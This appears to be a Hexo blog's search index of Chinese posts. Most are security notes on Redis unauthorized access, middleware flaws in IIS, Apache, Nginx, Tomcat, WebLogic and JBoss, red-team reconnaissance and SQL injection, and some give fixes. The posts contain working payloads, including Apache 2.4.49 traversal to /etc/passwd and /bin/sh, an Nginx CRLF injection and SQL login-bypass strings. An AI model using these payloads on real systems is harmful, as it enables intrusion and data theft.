<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vtb虚拟主播的初次尝试</title>
      <link href="/2024/12/19/vtb%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%92%AD%E7%9A%84%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/"/>
      <url>/2024/12/19/vtb%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%92%AD%E7%9A%84%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vtb虚拟主播的初次尝试"><a href="#vtb虚拟主播的初次尝试" class="headerlink" title="vtb虚拟主播的初次尝试"></a>vtb虚拟主播的初次尝试</h1><h2 id="一、使用设备和相对应的软件"><a href="#一、使用设备和相对应的软件" class="headerlink" title="一、使用设备和相对应的软件"></a>一、使用设备和相对应的软件</h2><h3 id="ai语音播报"><a href="#ai语音播报" class="headerlink" title="ai语音播报"></a>ai语音播报</h3><p>可以使用b站up<strong>Love丶伊卡洛斯</strong>的项目</p><p>视频教学<a href="https://space.bilibili.com/3709626/lists?sid=1422512">Love丶伊卡洛斯视频专辑-Love丶伊卡洛斯视频合集-哔哩哔哩视频</a></p><p>项目地址</p><p><a href="https://ikaros521.eu.org/site/#_2">Luna AI</a></p><h3 id="直播弹幕显示"><a href="#直播弹幕显示" class="headerlink" title="直播弹幕显示"></a>直播弹幕显示</h3><p>可以使用b站up只熊KUMA的项目</p><p><a href="https://www.yuque.com/doodle-irifi/ueaigm/laogg2">blivechat弹幕姬使用教程</a></p><h3 id="虚拟姬显示"><a href="#虚拟姬显示" class="headerlink" title="虚拟姬显示"></a>虚拟姬显示</h3><p>OBS下载</p><p><a href="https://obsproject.com/zh-cn/download">https://obsproject.com/zh-cn/download</a></p><p>STEAM下载vtuber</p><h3 id="歌曲提示"><a href="#歌曲提示" class="headerlink" title="歌曲提示"></a>歌曲提示</h3><h2 id="二、实战演示"><a href="#二、实战演示" class="headerlink" title="二、实战演示"></a>二、实战演示</h2><p>一切都配置完成之后 ，可以启动第一个Up的项目</p><p>AI-Vtuber-20241127</p><p>然后是第二个up的项目</p><p>blivechat-1.8.2-230924-windows-x64</p><p>进入obs设置源为steam的vtuber</p><p>然后是浏览器的显示。在第二个up的使用教程都有。</p><p>以B站为例子</p><p>下载b站直播软件</p><p>打开第三方推流模式，在obs里面填写服务器和推流码</p><p><img src="/2024/12/19/vtb%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%92%AD%E7%9A%84%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/1.png" alt="1"></p><p>接入第三方机器</p><p><img src="/2024/12/19/vtb%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%92%AD%E7%9A%84%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95/2.png" alt="1734787650795"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言程序从零到一详解</title>
      <link href="/2024/12/10/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/12/10/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="50bbc744ea9e36c9e79711e51c7d9305cd37ff9c6f7b33de96a592bda08db76a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> c语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis漏洞总结</title>
      <link href="/2024/12/05/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/05/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="redis是什么"><a href="#redis是什么" class="headerlink" title="redis是什么"></a>redis是什么</h2><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。默认端口：6379 sentinel.conf配置器端口为：26379</p><h3 id="Redis-未授权访问漏洞"><a href="#Redis-未授权访问漏洞" class="headerlink" title="Redis 未授权访问漏洞"></a><strong>Redis 未授权访问漏洞</strong></h3><p>Redis默认情况下，会绑定<code>0.0.0.0:6379</code>，如果没有采用相关的策略，比如添加防火墙规则表面其他非信任来源IP访问等，这样会将Redis服务暴露到公网上，如果在没有设置密码认证 (一般为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据</p><p>攻击者在未授权访问Redis的情况下，利用Redis自身提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥 写入目标服务器的<code>/root/.ssh</code>文件夹中authotrized_keys文件中，进而可以只用对应私钥直接使用ssh服务登录目标服务器。</p><h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a><strong>条件</strong></h5><ul><li>redis绑定在<code>0.0.0.0:6379</code>,且没有添加防火墙规则避免其他非信任来源IP访问等相关安全策略，直接暴露在公网</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务</li></ul><h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h5><p>1.攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行f1usha11来清空所有数据<br>2.攻击者可通过VL执行lua代码，或通过数据备份功能往磁盘写入后门程序<br>3.最严重的情况，如果Rdis以root身份与运行，黑客可以给root账户写入SSH公钥文件直接通过SSH登录受害服务器</p><p><strong>漏洞的影响版本</strong></p><p>Redis 2.x，3.x，4.x，5.x</p><h4 id="未授权-Redis-拿-shell-的-3-种方式"><a href="#未授权-Redis-拿-shell-的-3-种方式" class="headerlink" title="未授权 Redis 拿 shell 的 3 种方式"></a>未授权 Redis 拿 shell 的 3 种方式</h4><p>1.通过写 SSH key<br>2.通过向 Web 目录中写入 webshell<br>3.通过写 crontab 计划任务</p><p>参考链接</p><p><a href="https://www.freebuf.com/articles/web/289231.html">Redis漏洞总结 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/qingzhang/articles/18195354">redis未授权漏洞复现（超详细） - qingzhang123 - 博客园</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见中间件漏洞</title>
      <link href="/2024/12/04/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/12/04/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>IIS：PUT漏洞、短文件名猜解、远程代码执行、解析漏洞等</p><p>Apache：解析漏洞、目录遍历等</p><p>Nginx:文件解析、目录遍历、CRLF注入、目录穿越等</p><p>Tomcat:远程代码执行、war后门文件部署等</p><p>JBoss:反序列化漏洞、war后门文件部署等</p><p>WebLogic:反序列化漏洞、SSRF任意文件上传、war后门文件部署等</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><h4 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h4><p>根据put协议，当我们浏览某个网站，访问某个资源时，如果网站存在这个资源，则会进行替换，若网站不存在这个资源，则会创建这个资源，所以我们可以利用put直接对网站写shell。</p><p>而IIS Server 如果在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，结合put协议就会造成任意文件上传漏洞。</p><h5 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h5><p>Web 服务扩展中关闭 WebDAV</p><p>禁用访客写入权限。</p><h4 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h4><p>IIS的短文件名机制，用户通过特殊payload访问构造的某个存在的短文件名，会返回404，访问不存在的短文件名，返回400，故而可以暴力猜解短文件名。</p><p>它使攻击者可以获取Web根目录下的文件&#x2F;文件名，造成敏感信息泄露</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.111.138/&#123;文件名&#125;*~1*/a.aspx</span><br></pre></td></tr></table></figure><h5 id="漏洞修复方案-1"><a href="#漏洞修复方案-1" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h5><p>1升级.net framework；</p><p>2修改注册表禁用短文件名功能：</p><p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem’，将其中的 NtfsDisabledotNameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效；</p><p>3CMD关闭NTFS 8.3文件格式的支持；</p><p>4将web根目录的内容拷贝到另一个位置，如c:\wwwroot到d:\wroot,然后删除原文件夹，再重命名d:\wroot到c:\wwwroot。</p><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>IIS5.x&#x2F;6.0，在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹时，其目录内的任何扩展名的文件都被<a href="https://so.csdn.net/so/search?q=IIS&spm=1001.2101.3001.7020">IIS</a>当作可执行文件来解析并执行</p><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>在IIS6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。</p><h4 id="其他解析类型"><a href="#其他解析类型" class="headerlink" title="其他解析类型"></a>其他解析类型</h4><p>在IIS6.0的版本，如下几种文件类型也会被执行。<br>xxx.asa xxx.cer xxx.cdx</p><h4 id="php-cgi漏洞"><a href="#php-cgi漏洞" class="headerlink" title="php-cgi漏洞"></a>php-cgi漏洞</h4><p>在IIS-7.0和IIS-7.5的版本，在php配置文件中，开启cgi.fix_pathinfo，然后上传一个1.jpg的一句话木马文件。然后用菜刀访问1.jpg&#x2F;.php即可连接一句话木马。</p><h5 id="漏洞修复方案-2"><a href="#漏洞修复方案-2" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h5><p>1.对新建目录文件名进行过滤，不允许新建包含‘.’的文件;</p><p>2.曲线网站后台新建目录的功能，不允许创建文件夹;</p><p>3.限制上传的脚本执行权限，不允许执行脚本;</p><p>4.编写正则过滤.asp&#x2F;xm.jpg，通过ISApi组件过滤.</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="Apache-HTTPD-换行解析漏洞"><a href="#Apache-HTTPD-换行解析漏洞" class="headerlink" title="Apache HTTPD 换行解析漏洞"></a>Apache <a href="https://so.csdn.net/so/search?q=HTTPD&spm=1001.2101.3001.7020">HTTPD</a> 换行解析漏洞</h4><p>Apache HTTPD是一款<a href="https://so.csdn.net/so/search?q=HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">HTTP服务器</a>，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:ip地址:端口/文件名.php%0a</span><br></pre></td></tr></table></figure><h4 id="Apache多后缀解析漏洞"><a href="#Apache多后缀解析漏洞" class="headerlink" title="Apache多后缀解析漏洞"></a>Apache多后缀解析漏洞</h4><p>apache httpd支持一个文件多个后缀，windows对于多后缀的识别是看最后一个“.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://IP地址/uploadfiles/1.php.jpg</span><br></pre></td></tr></table></figure><h4 id="Apache-HTTP-路径穿越漏洞"><a href="#Apache-HTTP-路径穿越漏洞" class="headerlink" title="Apache HTTP 路径穿越漏洞"></a>Apache HTTP 路径穿越漏洞</h4><p>在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：<br>  版本等于2.4.49<br>  穿越的目录允许被访问（默认情况下是不允许的）<br>  攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p><h5 id="读取任意文件poc"><a href="#读取任意文件poc" class="headerlink" title="读取任意文件poc"></a>读取任意文件poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure><h5 id="执行任意命令poc"><a href="#执行任意命令poc" class="headerlink" title="执行任意命令poc"></a>执行任意命令poc</h5><p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh   最下面添加echo;id</span><br></pre></td></tr></table></figure><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><h4 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h4><p>下面两种情景十分常见：</p><p>用户访问<a href="http://example.com/aabbcc%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E5%88%B0https://example.com/aabbcc">http://example.com/aabbcc，自动跳转到https://example.com/aabbcc</a><br>用户访问<a href="http://example.com/aabbcc%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%B7%B3%E8%BD%AC%E5%88%B0http://www.example.com/aabbcc">http://example.com/aabbcc，自动跳转到http://www.example.com/aabbcc</a><br>第二个场景主要是为了统一用户访问的域名，更加有益于SEO优化。</p><p>在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从Nginx获取用户请求的文件路径。查看Nginx文档，可以发现有三个表示uri的变量：</p><p>$uri<br>$document_uri<br>$request_uri<br>解释一下，1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。</p><p>错误配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    <span class="built_in">return</span> 302 https://$host<span class="variable">$uri</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#因为`$uri`是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。</span></span><br></pre></td></tr></table></figure><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#请求内容</span><br><span class="line">curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1</span><br><span class="line">#测试结果</span><br><span class="line">[root@blackstone insecure-configuration]# curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1</span><br><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.13.0</span><br><span class="line">Date: Thu, 12 Jan 2023 12:18:16 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 161</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://192.168.2.169:8080/</span><br><span class="line">Set-Cookie: a=1</span><br></pre></td></tr></table></figure><p>我们使用burp抓包可以看到另一种可能性：在我们发送两个连续的换行<code>\r\n</code>后，可以直接修改返回报文的返回体。插入js代码引发xss</p><p>解决方案</p><p>在获取用户的请求路径时，配置文件内出现的配置应当是<code>$request_uri</code>,例如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    <span class="built_in">return</span> 302 https://$host<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1.编辑配置文件，投放进docker</span><br><span class="line">[root@blackstone configuration]# cat fix1.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen 8080;</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">    root /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">    index index.html;</span><br><span class="line"></span><br><span class="line">    server_name _;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">            return 302 http://$host:$server_port$request_uri;</span><br><span class="line">    &#125;</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#2.将配置文件放到特定目录，重启nginx</span><br><span class="line">[root@blackstone configuration]# docker exec -it fa2e43aabeec /bin/bash</span><br><span class="line">root@fa2e43aabeec:/# cp fix1.conf /etc/nginx/conf.d/</span><br><span class="line">root@fa2e43aabeec:/# rm -f /etc/nginx/conf.d/error1.conf </span><br><span class="line">root@fa2e43aabeec:/etc/nginx/conf.d# nginx -s reload</span><br><span class="line"></span><br><span class="line">#3.查看效果，确实可以有效消除CRLF的影响</span><br><span class="line">[root@blackstone ~]# curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1</span><br><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx/1.13.0</span><br><span class="line">Date: Wed, 08 Feb 2023 18:44:14 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 161</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure><h4 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h4><p>这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。</p><p>假设静态文件存储在&#x2F;home&#x2F;目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">    alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。</span><br><span class="line"></span><br><span class="line">但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录：</span><br><span class="line"></span><br><span class="line">2.2.2 利用方式</span><br><span class="line">http://192.168.2.169:8081/files../</span><br></pre></td></tr></table></figure><h4 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h4><p>这二者合在一起，在网页有文件上传功能时，百分百引发文件上传漏洞。属于高危配置手法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#php.ini --- 在php.ini中开启路径修复功能</span><br><span class="line">cgi.fix_pathinfo=1</span><br><span class="line"></span><br><span class="line">#php-fpm.conf --- 在php-fpm模块中开启了.jpg的php解析</span><br><span class="line">security.limit_extensions = .php .jpg</span><br></pre></td></tr></table></figure><p>漏洞成因就是同时开启路径修复和图片后缀名解析(或者直接将解析配置为空)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.2.169/uploadfiles/c3d13d4e323f0927a9dadb85ece4aea3.jpg/.php</span><br></pre></td></tr></table></figure><p>一、低版本nginx<br>空字节代码执行漏洞：nginx 0.5.x、nginx 0.6.x、Nginx 0.7-0.7.65、Nginx 0.8-0.8.37中可以通过在任意文件名后面增加%00.php解析为php，如1.jpg%00.php</p><p>二、php-cgi漏洞<br>和IIS的第四点相同，在php配置文件中，开启了cgi.fix_pathinfo，导致图片马1.jpg可以通过访问1.jpg&#x2F;.php、1.jpg%00.php解析成php文件</p><h3 id="windows解析漏洞"><a href="#windows解析漏洞" class="headerlink" title="windows解析漏洞"></a>windows解析漏洞</h3><p>Windows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾。<br>当把一个文件命名为以空格或.开头或结尾时，会自动地去掉开头和结尾处的空格和.。利用此特性，也可能造成文件解析漏洞</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><h4 id="Tomcat-弱口令-后台getshell"><a href="#Tomcat-弱口令-后台getshell" class="headerlink" title="Tomcat 弱口令 &amp;&amp; 后台getshell"></a>Tomcat 弱口令 &amp;&amp; 后台getshell</h4><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li><pre><code>- manager（后台管理）  - manager-gui 拥有html页面权限  - manager-status 拥有查看status的权限  - manager-script 拥有text接口的权限，和status权限  - manager-jmx 拥有jmx权限，和status权限- host-manager（虚拟主机管理）  - admin-gui 拥有html页面权限  - admin-script 拥有text接口权限<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">用户tomcat拥有上述所有权限，密码是tomcat</span><br><span class="line"></span><br><span class="line">正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</span><br><span class="line"></span><br><span class="line">为什么上传war包</span><br><span class="line"></span><br></pre></td></tr></table></figure>war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML/CSS/JS代码,以及后台JavaWeb的代码。</code></pre></li></ul><p>当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包</p><p>可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">详情可以参考：[16.Tomcat弱口令 &amp;&amp; 后台getshell漏洞 - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/9892653.html)</span><br><span class="line"></span><br><span class="line">### WebLogic</span><br><span class="line"></span><br><span class="line">#### WebLogic弱口令 &amp;&amp; 后台getshell</span><br><span class="line"></span><br><span class="line">weblogic常用弱口令： &lt;http://cirt.net/passwords?criteria=weblogic&gt;</span><br><span class="line"></span><br><span class="line">详情可以参考[12.Weblogic 弱口令 &amp;&amp; 后台getshell漏洞 - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/9822886.html)</span><br><span class="line"></span><br><span class="line">#### WebLogic反序列化漏洞</span><br><span class="line"></span><br><span class="line">T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</span><br><span class="line">（可通过nmap脚本–script=weblogic-t3-info查看weblogic版本信息和t3协议是否开启）</span><br><span class="line"></span><br><span class="line">[Weblogic漏洞复现(全漏洞版本) - Arrest - 博客园](https://www.cnblogs.com/arrest/articles/17506650.html#0x01:CVE-2017-10271 XMLDecoder 反序列化漏洞)</span><br><span class="line"></span><br><span class="line">#### Weblogic SSRF漏洞</span><br><span class="line"></span><br><span class="line">Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</span><br><span class="line"></span><br><span class="line">SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，我们在burpsuite下测试该漏洞。访问一个可以访问的IP:PORT，如`http://127.0.0.1:80`：(发送get请求也是一样)</span><br><span class="line"></span><br><span class="line">[Weblogic漏洞复现(全漏洞版本) - Arrest - 博客园](https://www.cnblogs.com/arrest/articles/17506650.html#0x01:CVE-2017-10271 XMLDecoder 反序列化漏洞)</span><br><span class="line"></span><br><span class="line">### JBoss</span><br><span class="line"></span><br><span class="line">#### Jboss 4.x版本jmx-console控制台弱口令getshell</span><br><span class="line"></span><br><span class="line">Jboss4.x版本在jmx-console控制台下存在像tomcat后台一样的控制台，我们可以通过上传war包的形式来上传马达到getshell</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://192.168.18.181:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment:type=DeploymentScanner,flavor=URL">http://192.168.18.181:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL</a></p><pre><code>[Jboss漏洞复现(全漏洞版本) - Arrest - 博客园](https://www.cnblogs.com/arrest/articles/17509983.html#0x04:Jboss 4.x版本jmx-console控制台弱口令getshell)#### CVE-2017-12149(JBoss 5.x6.x 反序列化漏洞)该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。[Jboss漏洞复现(全漏洞版本) - Arrest - 博客园](https://www.cnblogs.com/arrest/articles/17509983.html#0x03:CVE-2017-12149(JBoss 5.x6.x 反序列化漏洞))</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红队打点小技巧</title>
      <link href="/2024/12/04/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2024/12/04/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>攻防信息收集小技巧</p><p>一、微信搜索找公众号</p><p>一开始拿到的只有目标名字，域名ip一概没有。拿到名字直接google肯定是没有的</p><p>这个时候，没有域名，没有资产吧！fofa找title,但是大概率也是没有的，<br>有也不准确<br>因为google爬虫都没有收录，传统搜索大概率是找不到的。<br>但是由于我们的目标是xx医院，几乎所有医院，叫得上名字的，他都会有一个东西-小程序，公众号挂号程序<br>所以我们拿着名字直接到微信搜索，但是也没有直接搜索出目标的资产，只有一个疾控中心，但是别急，看下面的其他文章</p><p>二、合理利用域名和ip<br>使用域名在fofa查找资产，<br>可以看到资产很少</p><p>但是使用ip,资产瞬间多了很多</p><p>三、遍历端口+目录</p><p>域名+ip做全端口扫描，目录扫描域名+ip做全端口扫描，目录扫描</p><p>baidu..com:8888&#x2F;x0x&#x2F;打所发现is,404,他可能只是没有设置首页文件，不代表他没有二级目录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的常见姿势</title>
      <link href="/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/"/>
      <url>/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h3 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a><strong>一、SQL注入</strong></h3><p>漏洞成因</p><p>当应用向后台发送数据时,没有经过严格过滤，将传入的数据当成了sql语句进行执行，导致了sql注入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from members where userid=&quot;</span>.<span class="variable">$_GET</span>[userid];</span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from members where userid=1 or 1=1&quot;</span>);</span><br></pre></td></tr></table></figure><p> 账号密码都存在注入 </p><p>正常后端语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;用户名&#x27;  and password=&#x27;密码&#x27;</span><br></pre></td></tr></table></figure><p>输入’&#x3D;’ 此时语句为如下,用户名 空等于空，密码空等于空，条件成立登录成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;=&#x27;&#x27;  and password=&#x27;&#x27;=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>正常的万能密码传入’or’1’&#x3D;’1 时语句如下，or是或，其中一个条件满足即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;    and password=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><p><img 